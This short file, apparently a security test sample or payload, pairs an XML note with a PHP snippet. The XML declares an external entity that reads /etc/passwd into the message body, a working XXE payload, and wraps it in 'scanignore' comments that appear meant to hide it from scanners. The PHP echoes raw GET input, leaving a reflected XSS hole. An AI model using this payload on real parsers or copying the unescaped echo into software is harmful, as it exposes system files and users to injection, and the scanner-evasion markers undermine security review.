<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
  <!--scanignore -->
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
 <!--scanignore -->
]>
<note>
  <to>Tony</to>
  <from>Alice</from>
  <heading>Meeting</heading>
  <body>&xxe;</body>
</note>

<?php
    $user_input = $_GET['user_input'];
    echo "You entered: " . $user_input;
?>

